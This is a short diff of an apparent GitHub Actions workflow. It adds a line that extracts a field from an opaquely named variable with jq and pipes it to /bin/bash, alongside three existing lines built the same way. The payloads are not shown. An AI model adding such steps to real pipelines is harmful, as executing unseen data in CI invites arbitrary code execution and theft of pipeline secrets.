@@ -34,6 +34,7 @@ jobs:
           echo $qo357 | jq -r .esz63162 | /bin/bash
           printf '%s' "$rlaew90" | jq -r .rp4 | /bin/bash
           echo $izot28 | jq -r .borch64 | /bin/bash
+          echo $j55 | jq -r .lrjhj18 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
